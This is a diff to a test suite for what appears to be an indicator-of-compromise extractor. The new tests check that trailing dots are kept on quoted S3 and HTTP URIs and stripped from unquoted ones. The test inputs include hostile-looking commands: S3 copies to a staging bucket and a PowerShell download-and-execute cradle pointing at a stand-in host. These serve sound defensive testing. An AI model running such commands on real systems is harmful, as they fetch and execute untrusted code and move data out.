@@ -264,4 +264,31 @@ describe("IOC hygiene — identifiers named inside a script block", () => {
   it("keeps a trailing slash on an s3:// prefix", () => {
     expect(values("aws s3 cp x s3://bissapromax/archives/.")).toEqual(["s3://bissapromax/archives/"]);
   });
+
+  // A QUOTED URI is the exception to the strip. The closing quote proves where the value ends, so
+  // a "." in front of it is object-key data, not the writer's sentence. An S3 key may legally end
+  // in a dot, and stripping it records a destination the script never used.
+  it("keeps trailing punctuation that a closing quote proves is part of the key", () => {
+    expect(values("aws s3 cp x 's3://bissapromax/evidence.'")).toContain("s3://bissapromax/evidence.");
+    expect(values('aws s3 cp x "s3://bissapromax/evidence."')).toContain("s3://bissapromax/evidence.");
+  });
+
+  it("still strips when no closing quote bounds the URI", () => {
+    // Opening quote, no matching closer: the dot ends the sentence, not the key.
+    expect(values('he staged it to "s3://bissapromax/evidence. Then he left')).toContain(
+      "s3://bissapromax/evidence",
+    );
+    // Prose quote around a whole sentence — the character before s3:// is a space, not a quote.
+    expect(values('he said "go to s3://bissapromax/evidence."')).toContain("s3://bissapromax/evidence");
+  });
+
+  // The URL pass must answer the same way, or the two spellings of one destination diverge again —
+  // which is the whole complaint #744 was filed about.
+  it("applies the same quote rule to the URL pass", () => {
+    const quoted = values("IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.')");
+    expect(quoted).toContain("http://evil.test/a.");
+    const bare = values("payload came from http://evil.test/a.");
+    expect(bare).toContain("http://evil.test/a");
+    expect(bare).not.toContain("http://evil.test/a.");
+  });
 });
